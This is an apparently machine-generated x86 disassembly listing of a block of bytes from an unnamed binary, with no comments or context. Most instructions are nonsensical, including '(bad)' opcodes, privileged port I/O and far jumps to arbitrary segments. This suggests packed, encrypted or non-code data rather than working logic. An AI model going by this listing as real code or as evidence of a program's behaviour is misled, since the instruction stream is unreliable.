  41e31c:	cmp    edi,DWORD PTR gs:[edi-0x7628935f]
  41e323:	lock pop esi
  41e325:	xor    ch,cl
  41e327:	mov    ah,0xed
  41e329:	je     0x41e365
  41e32b:	sbb    BYTE PTR [ecx-0x1f],0x96
  41e32f:	sub    al,0xcd
  41e331:	sub    DWORD PTR [edi-0x1468e48f],ebx
  41e337:	jbe    0x41e2ce
  41e339:	out    dx,al
  41e33a:	and    DWORD PTR [edx+0x59415fe3],esp
  41e340:	ins    BYTE PTR es:[edi],dx
  41e341:	fnsave [esp+ebp*1-0xf24331c]
  41e348:	test   al,0x40
  41e34a:	adc    ebp,ecx
  41e34c:	mov    eax,ds:0x302d9c8e
  41e351:	pop    esi
  41e352:	cli    
  41e353:	mov    esp,0xd92d128a
  41e358:	xchg   ebp,eax
  41e359:	ss dec edi
  41e35b:	cwde   
  41e35c:	sbb    eax,0x8075789
  41e361:	xchg   esp,eax
  41e362:	enter  0xef91,0xb2
  41e366:	xchg   edx,eax
  41e367:	pop    ss
  41e368:	or     eax,0xe8f17b8f
  41e36d:	xor    al,0xd1
  41e36f:	push   edi
  41e370:	ss mov bh,0xcf
  41e373:	xchg   edi,eax
  41e374:	sub    ecx,DWORD PTR [ecx]
  41e376:	push   esi
  41e377:	push   0xffffffe7
  41e379:	ret    
  41e37a:	and    BYTE PTR [edx+esi*2-0x2b],cl
  41e37e:	mov    eax,0x95db182e
  41e383:	lds    ecx,FWORD PTR [edi+0x78]
  41e386:	ret    
  41e387:	add    esp,ebp
  41e389:	loop   0x41e330
  41e38b:	clc    
  41e38c:	enter  0x9f8e,0x45
  41e390:	cli    
  41e391:	inc    ebx
  41e392:	cmp    edi,DWORD PTR [esp+eax*2-0x35]
  41e396:	mov    dh,0x6f
  41e398:	add    eax,0x643b6a68
  41e39d:	pop    es
  41e39e:	mov    edi,0x85a1e040
  41e3a3:	daa    
  41e3a4:	mov    eax,0x84d42ce4
  41e3a9:	xor    BYTE PTR [edx+eax*1],al
  41e3ac:	sahf   
  41e3ad:	cmp    ebp,DWORD PTR [eax+eiz*4]
  41e3b0:	stc    
  41e3b1:	neg    dh
  41e3b3:	inc    esi
  41e3b4:	jmp    0x7191a346
  41e3b9:	xchg   esp,eax
  41e3ba:	pop    eax
  41e3bb:	in     eax,dx
  41e3bc:	in     eax,0x0
  41e3be:	or     al,0x9e
  41e3c0:	xchg   esp,eax
  41e3c2:	xor    cl,BYTE PTR [ebp+0x1e]
  41e3c5:	dec    ebp
  41e3c6:	loopne 0x41e40b
  41e3c8:	mov    bl,0x2e
  41e3ca:	xor    eax,0x378bcabc
  41e3cf:	loop   0x41e3d8
  41e3d1:	pop    edx
  41e3d2:	cmc    
  41e3d3:	cmp    eax,0xf7e29e68
  41e3d8:	or     bl,BYTE PTR [eax+0x2e85717]
  41e3de:	mov    WORD PTR [eax],?
  41e3e0:	imul   edi,esi,0xfffffff2
  41e3e3:	clc    
  41e3e4:	mov    esi,DWORD PTR [edi-0x3e]
  41e3e7:	fdivr  st,st(1)
  41e3e9:	and    edi,DWORD PTR [edx-0x6a]
  41e3ec:	sbb    ebx,DWORD PTR [eax]
  41e3ee:	inc    ecx
  41e3ef:	into   
  41e3f0:	test   BYTE PTR [edx+edx*8+0x13],bl
  41e3f4:	test   eax,0xf198405f
  41e3f9:	in     al,0x63
  41e3fb:	pushf  
  41e3fc:	cmc    
  41e3fd:	cmp    al,0x71
  41e400:	sahf   
  41e401:	fld    QWORD PTR [eax-0x35]
  41e405:	scas   eax,DWORD PTR es:[edi]
  41e406:	push   ecx
  41e407:	fs loopne 0x41e3ad
  41e40a:	mov    cl,0x36
  41e40c:	test   eax,0xc597634d
  41e411:	mov    ebp,DWORD PTR [ebx-0xc]
  41e414:	(bad)  
  41e415:	ins    BYTE PTR es:[edi],dx
  41e416:	adc    ebp,DWORD PTR [ebx-0x4113b661]
  41e41c:	(bad)  
  41e41d:	and    eax,0xe658e3e3
  41e422:	out    dx,eax
  41e423:	mov    ebp,0x33a33ed6
  41e428:	shl    ecx,0xd9
  41e42b:	pop    esp
  41e42c:	jle    0x41e3cd
  41e42e:	mov    dl,0xab
  41e430:	test   BYTE PTR [eax],0x5
  41e433:	jge    0x41e410
  41e435:	xchg   edi,eax
  41e436:	int    0xdf
  41e438:	or     DWORD PTR ds:0x146a2e0f,esp
  41e43e:	int    0x74
  41e440:	aad    0x72
  41e442:	cdq    
  41e443:	adc    dl,ch
  41e445:	jmp    0xf7755429
  41e44a:	add    BYTE PTR [ecx],0x5
  41e44d:	stos   BYTE PTR es:[edi],al
  41e44e:	(bad)  
  41e44f:	and    BYTE PTR [esi],al
  41e451:	popa   
  41e452:	xor    al,0x55
  41e454:	cdq    
  41e455:	xor    al,0xd5
  41e457:	bnd jge 0x41e445
  41e45a:	lock in eax,0xb8
  41e45d:	sub    BYTE PTR [ecx-0x4d],0xbf
  41e461:	push   ecx
  41e462:	into   
  41e463:	fsubr  QWORD PTR [edi-0xe521daf]
  41e469:	jo     0x41e49d
  41e46b:	xchg   BYTE PTR cs:[ebx],dh
  41e46e:	push   edx
  41e46f:	test   al,0x37
  41e471:	lods   eax,DWORD PTR ds:[esi]
  41e472:	iret   
  41e473:	int    0xc9
  41e475:	xlat   BYTE PTR ds:[ebx]
  41e476:	aaa    
  41e477:	mov    eax,ds:0x1ec8a7
  41e47c:	cmp    eax,ebx
  41e47e:	data16 int 0xb5
  41e481:	push   eax
  41e482:	pop    ebx
  41e483:	xor    bh,BYTE PTR [edx+0x5]
  41e486:	xchg   edx,eax
  41e487:	ret    0x3b39
  41e48a:	mov    BYTE PTR [esi+0x72cc48ae],cl
  41e490:	daa    
  41e491:	cli    
  41e492:	cli    
  41e493:	popa   
  41e494:	mov    WORD PTR [edi-0x36f8f9ca],?
  41e49a:	jne    0x41e506
  41e49c:	call   0x10ebf2c2
  41e4a1:	xchg   ebp,eax
  41e4a2:	inc    ecx
  41e4a3:	xchg   BYTE PTR [esi-0x5d],ah
  41e4a6:	sub    al,0x29
  41e4a8:	outs   dx,DWORD PTR ds:[esi]
  41e4a9:	mov    ch,0x81
  41e4ab:	push   esp
  41e4ac:	arpl   WORD PTR [ebx-0x38],si
  41e4af:	and    dh,BYTE PTR [ecx-0x25748c5f]
  41e4b5:	in     al,dx
  41e4b6:	retf   0x41a2
  41e4b9:	(bad)  
  41e4bb:	int    0x7f
  41e4bd:	in     al,dx
  41e4be:	mov    DWORD PTR [edi+0x29cd5868],esi
  41e4c4:	test   BYTE PTR ds:0xa0e35a3a,ah
  41e4ca:	dec    ebx
  41e4cb:	and    edx,edx
  41e4cd:	inc    edi
  41e4ce:	pop    ebp
  41e4cf:	je     0x41e50a
  41e4d1:	sar    DWORD PTR [eax-0x2854041b],0x92
  41e4d8:	push   ebx
  41e4d9:	(bad)  
  41e4da:	aas    
  41e4db:	mov    eax,DWORD PTR [ebp+0x377e1515]
  41e4e1:	stos   BYTE PTR es:[edi],al
  41e4e2:	(bad)  
  41e4e3:	sbb    BYTE PTR [eax],ah
  41e4e5:	and    DWORD PTR [esi-0x5c],edi
  41e4e8:	leave  
  41e4e9:	sbb    eax,edi
  41e4eb:	fcmovu st,st(4)
  41e4ed:	aas    
  41e4ee:	pop    ecx
  41e4ef:	xchg   esi,eax
  41e4f0:	sub    eax,DWORD PTR [eax+0x5d72afdf]
  41e4f6:	xchg   edi,eax
  41e4f7:	or     esi,DWORD PTR [eax-0x6cfc37]
  41e4fd:	pop    ecx
  41e4fe:	hlt    
  41e4ff:	dec    DWORD PTR [edi+ebp*4+0x37]
  41e503:	imul   ch
  41e505:	in     eax,0x58
  41e507:	or     BYTE PTR [edx],dh
  41e509:	sbb    eax,0xf3c13d7f
  41e50e:	jae    0x41e50a
  41e510:	inc    ecx
  41e511:	imul   ebp,edx,0x3f
  41e514:	pop    edi
  41e515:	and    BYTE PTR [ebx+0x52],al
  41e518:	mov    cl,0x46
  41e51a:	sbb    ah,BYTE PTR [bp+di]
  41e51d:	popa   
  41e51e:	in     eax,0xa7
  41e520:	xchg   edi,eax
  41e521:	cmp    BYTE PTR [ecx],0xb2
  41e524:	popa   
  41e525:	xchg   eax,edi
  41e527:	cmp    ch,dl
  41e529:	lahf   
  41e52a:	jne    0x41e528
  41e52c:	mov    ds:0x7a04613a,al
  41e531:	popf   
  41e532:	sahf   
  41e533:	cmp    eax,0xfa51872a
  41e538:	nop
  41e539:	sbb    DWORD PTR [edx+0x204f8d10],0x34972d7e
  41e543:	fstp   QWORD PTR [ecx]
  41e545:	popa   
  41e546:	push   esp
  41e547:	outs   dx,DWORD PTR ds:[esi]
  41e548:	mov    DWORD PTR [ebx],edx
  41e54a:	and    eax,0x7e892a92
  41e54f:	jmp    0xa655:0x6185a4d0
  41e556:	(bad)  [eax+0x78]
  41e559:	add    DWORD PTR gs:[esi],ebx
  41e55c:	test   BYTE PTR ds:0x315db3d4,dh
  41e562:	ror    DWORD PTR [ebx+0x668ac375],1
  41e568:	dec    edx
  41e569:	arpl   cx,cx
  41e56b:	(bad)  
  41e56c:	xchg   ecx,eax
  41e56d:	fs in  al,0x77
  41e570:	ror    cl,cl
  41e572:	mov    esi,DWORD PTR [eax]
  41e574:	aaa    
  41e575:	push   ecx
  41e576:	or     BYTE PTR [ebp+0x7a],bl
  41e579:	ss loopne 0x41e58a
  41e57c:	popa   
  41e57d:	fisub  WORD PTR [edx-0x40]
  41e580:	pop    edi
  41e581:	loopne 0x41e54e
  41e583:	lock stos DWORD PTR es:[edi],eax
  41e585:	punpckldq mm1,DWORD PTR [eax-0x18]
  41e589:	push   es
  41e58a:	mov    edx,0x26c1f7ca
  41e58f:	pop    ebp
  41e590:	jae    0x41e543
  41e592:	sub    DWORD PTR [ebx-0x67],ebx
  41e595:	push   es
  41e596:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41e598:	mov    ecx,0x50cd1a3f
  41e59d:	inc    ebx
  41e59e:	repz sub BYTE PTR [ebp+0x5b8d4db3],ah
  41e5a5:	and    BYTE PTR [eax+0x53],al
  41e5a8:	inc    esp
  41e5a9:	mov    eax,ds:0x35817d34
  41e5ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5af:	cmp    bl,BYTE PTR [eax]
  41e5b1:	xchg   ebx,eax
  41e5b2:	sbb    dh,BYTE PTR ds:0xc77995d2
  41e5b8:	out    dx,al
  41e5b9:	sbb    eax,DWORD PTR [esi+ebp*4]
  41e5bc:	xchg   ecx,eax
  41e5bd:	jne    0x41e5a2
  41e5bf:	ss leave 
  41e5c1:	cmp    bl,BYTE PTR [esp+edx*8-0x4840b27d]
  41e5c8:	mov    BYTE PTR [ebp-0x16],ch
  41e5cb:	fdiv   QWORD PTR [ebx+0x13]
  41e5ce:	test   DWORD PTR [edi+eiz*1-0x1],ebx
  41e5d2:	test   BYTE PTR [ebx+ebp*4+0x4d],bh
  41e5d6:	fst    DWORD PTR [ecx+ebx*2-0x5e]
  41e5da:	push   eax
  41e5db:	repnz pop ecx
  41e5dd:	clc    
  41e5de:	or     DWORD PTR [edx],eax
  41e5e0:	inc    edi
  41e5e1:	xchg   ebx,eax
  41e5e2:	mov    eax,0x781834fa
  41e5e7:	push   esp
  41e5e8:	push   edx
  41e5e9:	push   esi
  41e5ea:	leavew 
  41e5ec:	pop    ds
  41e5ed:	stos   BYTE PTR es:[edi],al
  41e5ee:	xchg   edi,eax
  41e5ef:	mov    esi,0xc7abe032
  41e5f4:	cwde   
  41e5f5:	mov    eax,ds:0xa9054fbc
  41e5fa:	sti    
  41e5fb:	xchg   ebx,eax
  41e5fc:	pop    eax
  41e5fd:	sub    ebx,DWORD PTR [edi]
  41e5ff:	ss popf 
  41e601:	shrd   DWORD PTR [edi],edx,cl
  41e604:	and    eax,0xfa7b5268
  41e609:	lock pop ebx
  41e60b:	sti    
  41e60c:	dec    ecx
  41e60d:	xchg   esi,eax
  41e60e:	dec    edx
  41e60f:	in     eax,dx
  41e610:	test   bh,bh
  41e612:	fbld   TBYTE PTR [edi-0x48]
  41e615:	xor    al,0x54
  41e617:	cmp    al,0x9a
  41e619:	loop   0x41e633
  41e61b:	and    al,0x4a
  41e61d:	outs   dx,DWORD PTR ds:[esi]
  41e61e:	or     BYTE PTR [eax-0x6a1077d],dl
  41e624:	ja     0x41e64c
  41e626:	repnz in al,dx
  41e628:	add    al,0x32
  41e62a:	inc    BYTE PTR ss:[ecx-0x2b]
  41e62e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e62f:	stos   DWORD PTR es:[edi],eax
  41e630:	push   edx
  41e631:	dec    edi
  41e632:	ss mov ecx,0xd7cab413
  41e638:	pop    edi
  41e639:	inc    ebx
  41e63a:	ret    
  41e63b:	scas   al,BYTE PTR es:[edi]
  41e63c:	fdiv   QWORD PTR [ecx+0x14]
  41e63f:	outs   dx,DWORD PTR ds:[esi]
  41e640:	sub    DWORD PTR [ebx+0x21702c78],ecx
  41e646:	retf   0x3e90
  41e649:	arpl   WORD PTR [esi-0x49],cx
  41e64c:	shl    cl,cl
  41e64e:	adc    al,0x36
  41e650:	aad    0x55
  41e652:	dec    ecx
  41e653:	lds    edx,FWORD PTR [ecx-0x41307eb4]
  41e659:	xchg   DWORD PTR [ebx+0x28],edx
  41e65c:	pop    eax
  41e65d:	dec    esi
  41e65e:	add    ah,cl
  41e660:	xchg   DWORD PTR [ecx+ebx*1-0x75],esi
  41e664:	repz inc eax
  41e666:	inc    eax
  41e667:	sti    
  41e668:	lds    esp,FWORD PTR [esi-0x2a]
  41e66b:	jns    0x41e6a3
  41e66d:	adc    ah,ch
  41e66f:	mov    al,ds:0x99f0b7b1
  41e674:	adc    ah,bh
  41e676:	rcr    BYTE PTR [ebx],0xf0
  41e679:	mov    cl,al
  41e67b:	rol    DWORD PTR [ecx-0x15],1
  41e67e:	add    eax,0x50bbb11b
  41e683:	xchg   DWORD PTR [edi+0x1d844aa9],esp
  41e689:	inc    ebx
  41e68a:	ret    0x1d9b
  41e68d:	lock lock sub ecx,esi
  41e691:	pop    ebp
  41e692:	imul   ebp,DWORD PTR [ecx],0x64
  41e695:	call   0xd580:0x655524a0
  41e69c:	ret    
  41e69d:	jno    0x41e718
  41e69f:	scas   al,BYTE PTR es:[edi]
  41e6a0:	pop    ss
  41e6a1:	stc    
  41e6a2:	dec    esi
  41e6a3:	clc    
  41e6a4:	adc    bl,dl
  41e6a6:	sbb    eax,0x16334424
  41e6ab:	dec    esi
  41e6ac:	out    dx,eax
  41e6ad:	loope  0x41e672
  41e6af:	aam    0xa2
  41e6b1:	xchg   ebp,eax
  41e6b2:	mov    ebx,0x303ad5a8
  41e6b7:	xchg   esi,eax
  41e6b8:	mov    ecx,0xc91b474c
  41e6bd:	femms  
  41e6bf:	jg     0x41e713
  41e6c1:	dec    esi
  41e6c2:	clc    
  41e6c3:	lock mov ds:0x474a2afd,al
  41e6c9:	adc    eax,0x1fe0498b
  41e6ce:	fdiv   DWORD PTR [ebx]
  41e6d0:	(bad)  
  41e6d1:	mov    ch,0xef
  41e6d3:	aas    
  41e6d4:	ins    BYTE PTR es:[edi],dx
  41e6d5:	retf   
  41e6d6:	sbb    dh,BYTE PTR [edi+0x4e5d816a]
  41e6dc:	pop    ebx
  41e6dd:	mov    eax,0x4acb328c
  41e6e2:	aas    
  41e6e3:	lds    ebx,FWORD PTR [edi+ecx*2]
  41e6e6:	bound  esp,QWORD PTR [ebp-0x5f]
  41e6e9:	repnz retf 0xd998
  41e6ed:	and    eax,0x6f296a92
  41e6f2:	loopne 0x41e703
  41e6f4:	aad    0x85
  41e6f6:	sub    al,0x4f
  41e6f8:	int3   
  41e6f9:	test   al,0xcc
  41e6fb:	mov    edx,0x3e73f25b
  41e700:	pop    esi
  41e701:	xchg   ebp,eax
  41e702:	cmp    eax,0xbd3135ed
  41e707:	lods   eax,DWORD PTR ds:[esi]
  41e708:	sub    al,cl
  41e70a:	xchg   esp,eax
  41e70b:	adc    eax,0x6cf86472
  41e710:	lds    edi,FWORD PTR [eax+edi*8+0x34df1b99]
  41e717:	in     al,0x15
  41e719:	rcr    DWORD PTR [edx],1
  41e71b:	xchg   edx,eax
  41e71c:	sti    
  41e71d:	ret    
  41e71e:	out    0xe1,al
  41e720:	inc    ecx
  41e721:	push   0x527082a5
  41e726:	lahf   
  41e727:	inc    ecx
  41e728:	fnstsw WORD PTR [eax]
  41e72a:	ret    
  41e72b:	cld    
  41e72c:	add    al,0x38
  41e72e:	xchg   edi,eax
  41e72f:	cli    
  41e730:	ins    BYTE PTR es:[edi],dx
  41e731:	mov    bh,0x5a
  41e733:	loop   0x41e6df
  41e735:	sbb    esp,esp
  41e737:	inc    ecx
  41e738:	adc    BYTE PTR [eax],ch
  41e73a:	mov    edi,esp
  41e73c:	test   al,bh
  41e73e:	rol    DWORD PTR [esi+0x1e3c0116],cl
  41e744:	pop    ebx
  41e745:	sub    eax,esp
  41e747:	aas    
  41e748:	dec    ecx
  41e749:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e74a:	retf   0x8985
  41e74d:	iret   
  41e74e:	stos   DWORD PTR es:[edi],eax
  41e74f:	or     al,0xc0
  41e751:	xchg   edi,eax
  41e752:	cmc    
  41e753:	xor    al,0x69
  41e755:	mov    ebp,0x84c5be73
  41e75a:	mov    esi,0xca8ea5ce
  41e75f:	data16 lahf 
  41e761:	fmul   DWORD PTR [ebx+edx*1]
  41e764:	pop    ds
  41e765:	nop
  41e766:	pop    edx
  41e767:	dec    edx
  41e768:	dec    eax
  41e769:	pop    ecx
  41e76a:	(bad)
  41e76e:	jp     0x41e738
  41e770:	js     0x41e7e2
  41e772:	mov    bh,0x4b
  41e774:	xchg   BYTE PTR ds:0x26166cf6,dh
  41e77a:	jns    0x41e716
  41e77c:	mov    dl,0xdc
  41e77e:	inc    edi
  41e77f:	sub    BYTE PTR [eax],cl
  41e781:	xchg   ecx,eax
  41e782:	dec    ebp
  41e783:	adc    dl,BYTE PTR [edx-0x2]
  41e786:	pop    ebp
  41e787:	lock sub eax,0x9641fedc
  41e78d:	test   DWORD PTR [eax],0x51ac0b1e
  41e793:	int3   
  41e794:	or     dl,BYTE PTR [edi+0x21]
  41e797:	mov    BYTE PTR [ecx-0x1e],dl
  41e79a:	repz sbb al,0x70
  41e79d:	shr    cl,0x95
  41e7a0:	or     BYTE PTR [edi+edx*8-0x28],0xf7
  41e7a5:	std    
  41e7a6:	sbb    dh,dh
  41e7a8:	sbb    BYTE PTR [ebp+0x79ac6d79],al
  41e7ae:	push   0x65
  41e7b0:	sub    al,0x29
  41e7b2:	and    eax,DWORD PTR [edx+0x7c0459ef]
  41e7b8:	add    DWORD PTR [ebx+0x5d],ebx
  41e7bb:	mov    edi,0x1d186d59
  41e7c0:	inc    eax
  41e7c1:	and    esi,esp
  41e7c3:	outs   dx,DWORD PTR ds:[esi]
  41e7c4:	repz je 0x41e7af
  41e7c7:	xor    eax,0xaa0dd524
  41e7cc:	retf   0xcd4a
  41e7cf:	loope  0x41e801
  41e7d1:	fcom   DWORD PTR [esi-0x573a6d78]
  41e7d7:	xchg   BYTE PTR [esi+0x43],ah
  41e7da:	push   cs
  41e7db:	pop    ebp
  41e7dc:	in     eax,0xe7
  41e7de:	mov    esi,0x8b146411
  41e7e3:	jne    0x41e7fb
  41e7e5:	pop    eax
  41e7e6:	das    
  41e7e7:	fldpi  
  41e7e9:	scas   eax,DWORD PTR es:[edi]
  41e7ea:	cmp    eax,0x4b0ff545
  41e7ef:	inc    edi
  41e7f0:	push   ebp
  41e7f1:	jle    0x41e781
  41e7f3:	and    al,0x5a
  41e7f5:	stc    
  41e7f6:	push   esp
  41e7f7:	inc    edi
  41e7f8:	out    dx,al
  41e7f9:	popa   
  41e7fa:	out    dx,eax
  41e7fb:	jmp    0x1ea7:0xe12f057a
  41e802:	clc    
  41e803:	daa    
  41e804:	xchg   edx,eax
  41e805:	sbb    eax,0xc1c37d9f
  41e80a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e80b:	test   ebx,ecx
  41e80d:	les    ebp,FWORD PTR [edi-0x2b]
  41e810:	lods   eax,DWORD PTR ds:[esi]
  41e811:	mov    ah,0xd
  41e813:	pop    ecx
  41e814:	mov    fs,ebx
  41e816:	jp     0x41e83d
  41e818:	aas    
  41e819:	cmp    dh,BYTE PTR [eax-0x30319ef1]
  41e81f:	enter  0xde36,0xb9
  41e823:	jmp    0x76b8a562
  41e828:	(bad)  
  41e82a:	adc    al,BYTE PTR [ebp+0x4129aa4e]
  41e830:	xor    al,0x38
  41e832:	test   al,0x80
  41e834:	jae    0x41e7f7
  41e836:	addr16 push ds
  41e838:	mov    eax,0x7875d89a
  41e83d:	cmp    DWORD PTR [esi+ebx*1-0x5e],edi
  41e841:	push   ss
  41e842:	push   0xffffff8d
  41e844:	jbe    0x41e8a8
  41e846:	out    0xc,al
  41e848:	(bad)  
  41e849:	xchg   esi,eax
  41e84a:	cmp    BYTE PTR [edx+0x3d],dl
  41e84d:	adc    edi,ecx
  41e84f:	cmp    dl,BYTE PTR [eax+0x6007702f]
  41e855:	pop    ss
  41e856:	out    dx,eax
  41e857:	test   bl,0xd9
  41e85a:	pusha  
  41e85b:	push   ebp
  41e85c:	bound  edi,QWORD PTR [esi-0x2a1739a]
  41e862:	ja     0x41e7e7
  41e864:	mov    ?,esi
  41e866:	mov    ebx,0xd2e2ecf
  41e86b:	cmc    
  41e86c:	mov    DWORD PTR [eax-0x41],esi
  41e86f:	std    
  41e870:	js     0x41e805
  41e872:	pop    edx
  41e873:	popf   
  41e874:	jecxz  0x41e835
  41e876:	lds    ebp,FWORD PTR [edi+edx*1-0x8997520]
  41e87d:	pop    esi
  41e87e:	jg     0x41e873
  41e880:	dec    esp
  41e881:	jp     0x41e8fd
  41e883:	jecxz  0x41e814
  41e885:	adc    BYTE PTR [esi+0x43bdffa1],ch
  41e88b:	push   edi
  41e88c:	fs (bad) 
  41e88e:	call   0xbef56203
  41e893:	stos   BYTE PTR es:[edi],al
  41e894:	and    al,0xb6
  41e896:	push   eax
  41e897:	int3   
  41e898:	xor    dl,BYTE PTR [ebp-0xf7cab5c]
  41e89e:	dec    esi
  41e89f:	xchg   edi,eax
  41e8a0:	(bad)  
  41e8a1:	shl    edx,cl
  41e8a3:	and    BYTE PTR [ecx+edi*1],0x45
  41e8a7:	cmp    ebx,ecx
  41e8a9:	inc    esp
  41e8aa:	out    0x6a,al
  41e8ac:	mov    dh,al
  41e8ae:	pop    ds
  41e8af:	mov    eax,0x2f4ffcc0
  41e8b4:	repz inc edi
  41e8b6:	stos   DWORD PTR es:[edi],eax
  41e8b7:	add    eax,0x9328742e
  41e8bc:	imul   ecx,esi,0x856835e7
  41e8c2:	(bad)  
  41e8c3:	jmp    0x60b9:0x6f1a193b
  41e8ca:	push   esi
  41e8cb:	not    BYTE PTR [edi-0x32]
  41e8ce:	cld    
  41e8cf:	fs mov ebp,0x90aa7a53
  41e8d5:	stos   DWORD PTR es:[edi],eax
  41e8d6:	ins    DWORD PTR es:[edi],dx
  41e8d7:	out    0xf3,eax
  41e8d9:	imul   eax,edx,0xffffff94
  41e8dc:	jb     0x41e89b
  41e8de:	xchg   ecx,eax
  41e8df:	ins    BYTE PTR es:[edi],dx
  41e8e0:	pop    es
  41e8e1:	xchg   esi,eax
  41e8e2:	jne    0x41e8e2
  41e8e4:	(bad)  
  41e8e5:	loope  0x41e8ec
  41e8e7:	retf   
  41e8e8:	add    ecx,edi
  41e8ea:	ret    0x488e
  41e8ed:	mov    esp,0x6290c27c
  41e8f2:	aas    
  41e8f3:	lods   al,BYTE PTR ds:[esi]
  41e8f4:	dec    esp
  41e8f5:	mov    ah,0xa
  41e8f7:	jno    0x41e8aa
  41e8f9:	test   BYTE PTR [ebp-0x30],dh
  41e8fc:	push   DWORD PTR [ecx]
  41e8fe:	mov    dl,0xc2
  41e900:	or     dl,BYTE PTR [ecx]
  41e902:	adc    DWORD PTR [ebp+0x47],edx
  41e905:	add    dh,al
  41e907:	popf   
  41e908:	dec    ebx
  41e909:	mov    ds:0x5534504c,al
  41e90e:	jno    0x41e951
  41e910:	adc    al,BYTE PTR [esi+0x5194d6fa]
  41e916:	inc    edx
  41e917:	adc    ebx,edi
  41e919:	dec    ebx
  41e91a:	sbb    al,0x7a
  41e91c:	dec    edx
  41e91d:	inc    esp
  41e91e:	xchg   dh,ah
  41e920:	in     eax,0xbe
  41e922:	into   
  41e923:	xor    eax,0x93b25537
  41e928:	cmp    DWORD PTR [ebx-0x5d],eax
  41e92b:	jnp    0x41e999
  41e92d:	sbb    eax,eax
  41e92f:	mov    eax,ds:0xf3a41bce
  41e934:	pop    ds
  41e935:	stos   BYTE PTR es:[edi],al
  41e936:	mov    ebx,0x6bd63d5a
  41e93b:	mov    ebp,0xba11d9c0
  41e940:	or     al,0x9
  41e942:	push   ds
  41e943:	xchg   edi,eax
  41e944:	scas   al,BYTE PTR es:[edi]
  41e945:	aam    0x66
  41e947:	mov    edi,DWORD PTR [edi]
  41e949:	loope  0x41e9b3
  41e94b:	push   es
  41e94c:	scas   eax,DWORD PTR es:[edi]
  41e94d:	adc    DWORD PTR [edi+eax*8+0x52984bd4],eax
  41e954:	test   BYTE PTR [eax+eax*2],bh
  41e957:	sub    ebx,edi
  41e959:	pop    edi
  41e95a:	pop    edx
  41e95b:	iret   
  41e95c:	adc    al,BYTE PTR [ebp+0x5e]
  41e95f:	xchg   BYTE PTR [ecx-0x16c0f605],bl
  41e965:	inc    ebx
  41e966:	push   ds
  41e967:	jns    0x41e966
  41e969:	mov    ds:0xce3cb93e,al
  41e96e:	fincstp 
  41e970:	sub    eax,0xc0f10151
  41e975:	sbb    BYTE PTR [ebp+0xb69bf84],dl
  41e97b:	push   edi
  41e97c:	adc    DWORD PTR [ecx-0x33],eax
  41e97f:	mov    ds:0x5933c99b,eax
  41e984:	add    eax,0x3e0eb42c
  41e989:	adc    dl,BYTE PTR [edi-0x2a]
  41e98c:	dec    ebx
  41e98d:	cmc    
  41e98e:	mov    cl,0x40
  41e990:	fisttp QWORD PTR [ecx-0x5d11deac]
  41e996:	cdq    
  41e997:	sbb    BYTE PTR [ebp-0x505d3a17],cl
  41e99d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e99e:	add    DWORD PTR [edi-0x19],ecx
  41e9a1:	dec    ebp
  41e9a2:	inc    eax
  41e9a3:	xchg   esi,eax
  41e9a4:	arpl   WORD PTR [eax-0x3e565895],ax
  41e9aa:	outs   dx,BYTE PTR ds:[esi]
  41e9ab:	sub    eax,DWORD PTR [ebx]
  41e9ad:	adc    al,BYTE PTR [ecx-0x10]
  41e9b0:	shr    BYTE PTR [edx],1
  41e9b2:	dec    esp
  41e9b3:	(bad)
  41e9b7:	mov    al,ds:0x27751b8f
  41e9bc:	jno    0x41e991
  41e9be:	(bad)  
  41e9bf:	jle    0x41e94d
  41e9c1:	test   eax,0x5db70af4
  41e9c6:	in     eax,dx
  41e9c7:	lahf   
  41e9c8:	stos   DWORD PTR es:[edi],eax
  41e9c9:	push   ebp
  41e9ca:	push   edi
  41e9cb:	call   0xb9dc:0x11f49ac0
  41e9d2:	jecxz  0x41e977
  41e9d4:	add    al,0xa4
  41e9d6:	xor    eax,0x17b74b78
  41e9db:	pop    ss
  41e9dc:	loop   0x41ea2f
  41e9de:	call   0x1a88aef5
  41e9e3:	loop   0x41e9cc
  41e9e5:	out    dx,al
  41e9e6:	mov    bh,BYTE PTR [edi-0x7c81193d]
  41e9ec:	test   eax,0xe16b44e3
  41e9f1:	icebp  
  41e9f2:	in     eax,dx
  41e9f3:	mov    cl,BYTE PTR cs:[esi]
  41e9f6:	sub    eax,0x5cf30f33
  41e9fb:	pop    esi
  41e9fc:	sbb    eax,0xeea55874
  41ea01:	aas    
  41ea02:	lock cmp eax,0x2d86e501
  41ea08:	frndint 
  41ea0a:	push   0x5e
  41ea0c:	retf   0x6203
  41ea0f:	rcl    bl,0x99
  41ea12:	xchg   edi,eax
  41ea13:	xchg   ebx,eax
  41ea14:	enter  0xef63,0xb6
  41ea18:	fild   WORD PTR [ecx]
  41ea1a:	mov    esp,0xff240f45
  41ea1f:	(bad)  
  41ea20:	scas   al,BYTE PTR es:[edi]
  41ea21:	in     al,0x84
  41ea23:	fldcw  WORD PTR [eax]
  41ea25:	add    al,0x53
  41ea27:	push   ecx
  41ea28:	bswap  ebx
  41ea2a:	pop    ds
  41ea2b:	xchg   BYTE PTR [eax],al
  41ea2d:	xlat   BYTE PTR ds:[ebx]
  41ea2e:	inc    ecx
  41ea2f:	je     0x41ea5b
  41ea31:	stc    
  41ea32:	aam    0xe8
  41ea34:	fdivr  QWORD PTR [esi+0x15]
  41ea37:	call   0x5d03:0xba282862
  41ea3e:	scas   al,BYTE PTR es:[edi]
  41ea3f:	call   0xa0a2:0xf3a6033d
  41ea46:	add    dl,cl
  41ea48:	sar    BYTE PTR [edx-0x14bf2605],0x52
  41ea4f:	imul   ecx,DWORD PTR [esi],0xffffff85
  41ea52:	jae    0x41e9f7
  41ea54:	lahf   
  41ea55:	sbb    edx,esp
  41ea57:	ret    0x58fc
  41ea5a:	mov    eax,0xbca4feed
  41ea5f:	xchg   ax,ax
  41ea61:	or     DWORD PTR [edx+eax*4-0x6],eax
  41ea65:	sbb    DWORD PTR [edi+0x56],esp
  41ea68:	fmulp  st(0),st
  41ea6a:	adc    DWORD PTR [ebp-0x3026771a],ebp
  41ea70:	lahf   
  41ea71:	sahf   
  41ea72:	dec    ecx
  41ea73:	mov    ds:0x88dfedc0,eax
  41ea78:	inc    esp
  41ea79:	mov    dh,0x4e
  41ea7b:	int3   
